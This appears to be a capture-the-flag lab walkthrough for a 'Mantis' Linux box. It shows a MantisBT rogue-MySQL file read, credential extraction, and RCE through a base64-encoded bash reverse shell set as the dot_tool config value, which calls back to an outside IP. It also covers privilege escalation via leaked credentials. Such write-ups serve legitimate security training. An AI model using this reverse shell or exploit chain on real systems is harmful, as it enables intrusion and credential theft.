# 🐜 Mantis (Linux)

## 🌐 Initial Foothold

- Discovered a **bugtracker web page** running on port `80`.
- Noticed `/vendor/` directory with files last modified in **2017** → Indicated old version.
- Found relevant [MantisBT exploit (23173)](https://mantisbt.org/bugs/view.php?id=23173).

### 🚨 Exploitation Steps

1. Cloned the [Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server).
2. Gave execution permissions and ran the rogue MySQL server:
   ```bash
   php roguemysql.php
   ```
3. Triggered malicious URL to initiate interaction:
   ```
   http://192.168.218.204/bugtracker/admin/install.php?install=3&hostname=192.168.45.194
   ```
4. Located config path via [Mantis config repo](https://github.com/mantisbt/mantisbt/tree/master/config):
   ```bash
   /var/www/html/bugtracker/config/config_inc.php
   ```
5. Extracted MySQL credentials and connected with:
   ```bash
   mysql -u root -p'' -h 192.168.218.204 -P 3306 --skip-ssl
   ```
6. Retrieved user hash from `mantis_user_table` → Cracked via [CrackStation](https://crackstation.net/) → Password: `prayingmantis`

### 💣 Gaining RCE

- Logged in and navigated to:  
  `Manage → Manage Configuration → Configuration Report`
- Created two entries:
  1. `relationship_graph_enable` = `1` (Integer)
  2. `dot_tool` = 
     ```bash
     echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE5NC8zMzA2IDA+JjE= | base64 -d | /bin/bash;
     ```
     (This base64 decodes to a bash reverse shell payload)

- Triggered the payload via:
  ```
  http://192.168.218.204/bugtracker/workflow_graph_img.php
  ```

- ✅ Got reverse shell!

## 🧑‍💻 Privilege Escalation

- Ran `pspy32s` → Saw scheduled process leaking credentials.
- Reused credentials to `su mantis` with password: `BugTracker007`
- Checked sudo permissions:
  ```bash
  sudo -l
  ```
- 🔓 Root access achieved.

---

## 📁 Git Integration Commands

```bash
# Move the file to the linux walkthroughs folder
mv ~/Downloads/Mantis.md ~/Downloads/walkthroughs_project_template/linux/Mantis.md

# Change directory to the project root
cd ~/Downloads/walkthroughs_project_template

# Add all changes to git
git add .

# Commit the changes with a descriptive message
git commit -m "Added Mantis (Linux) walkthrough"

# Push the commit to GitHub
git push
```
